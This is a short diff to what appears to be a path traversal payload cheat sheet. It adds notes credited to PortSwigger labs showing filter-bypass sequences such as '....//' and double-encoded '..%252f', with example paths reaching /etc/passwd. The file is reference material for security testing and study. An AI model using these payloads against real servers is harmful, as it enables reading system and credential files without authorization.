@@ -40,6 +40,18 @@ We can use the `..` characters to access the parent directory, the following str
 %uff0e%uff0e%u2215
 %uff0e%uff0e%u2216
 ```
+## Add note from Portswigger 
+
+File path traversal, traversal sequences stripped non-recursively
+```
+....// or ....\/
+Example: ....//....//....//etc/passwd
+```
+File path traversal, traversal sequences stripped with superfluous URL-decode
+```
+..%c0%af or ..%252f
+Example: ..%252f..%252f..%252fetc/passwd. 
+```
 
 ### 16 bits Unicode encoding
 
